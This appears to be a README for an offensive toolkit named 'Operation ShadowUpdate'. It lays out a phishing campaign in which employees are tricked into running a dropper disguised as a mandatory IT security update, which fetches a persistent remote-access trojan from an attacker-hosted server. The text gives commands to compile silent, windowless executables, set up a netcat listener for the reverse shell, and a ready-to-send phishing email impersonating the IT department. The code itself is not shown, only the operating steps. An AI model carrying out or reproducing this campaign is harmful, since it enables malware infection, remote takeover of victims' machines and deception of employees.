# Operation ShadowUpdate

## Scenario
Company X employees are targeted via a phishing email disguised as a mandatory software update from IT. Victims download and run `SoftwareUpdate.exe`, a dropper that installs a custom RAT.

## Components
- **dropper.py** → Downloads + runs the RAT silently.
- **rat.py** → Persistent RAT with remote shell capability.
- **email_template.txt** → Phishing lure template.

## Prerequisites

- **Netcat (Ncat)**: Required to run the listener.
  - **Windows**: Download Ncat (via Nmap): https://nmap.org/download.html
  - **Linux**: Usually preinstalled. If not:
    ```bash
    sudo apt install netcat
    ```
  - **macOS**: Usually preinstalled. If not:
    ```bash
    brew install netcat
    ```

- **PyInstaller**: Required to build the executables (dropper + RAT).
  - All platforms:
    ```bash
    pip install pyinstaller
    ```
## Execution
1️⃣ Compile dropper + RAT to build a single silent exe for the dropper and the RAT (no need for python on target machine)
```bash
pyinstaller --onefile --noconsole --name SoftwareUpdate dropper.py
pyinstaller --onefile --noconsole rat.py
```
2️⃣ Host `rat.exe` (compiled RAT) on `http://yourserver.com/rat.exe`

3️⃣ On the attacker machine, run a Netcat listener to accept connections from the RAT:
```bash
nc -lvnp 443
```
Where:
- `-l` → Listen for incoming connections
- `-v` → Verbose output (shows connection info)
- `-n` → Do not resolve DNS (faster)
- `-p 443` → Listen on port 443 (must match RAT's configured port)

Ensure port 443 is open on the attacker's firewall/router.


4️⃣ Deliver `SoftwareUpdate.exe` (the dropper) to target using an email, or other social engineering method.

## Example Phishing Email
```
From: it-support@companyx.com
Subject: URGENT: Security Update Required

Dear employee,

A critical security patch is required. Download and run the attached SoftwareUpdate.exe immediately.
Trust us. We’re the IT department.

IT Security Team
Company X
```
